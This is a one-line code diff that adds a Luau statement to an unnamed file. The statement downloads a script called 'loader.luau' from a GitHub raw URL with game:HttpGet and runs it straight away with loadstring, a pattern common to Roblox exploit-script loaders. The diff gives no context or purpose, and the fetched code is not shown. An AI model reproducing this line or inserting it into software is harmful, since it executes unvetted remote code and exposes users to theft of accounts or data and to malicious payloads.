@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/vasliz/x/refs/heads/main/loader.luau"))()
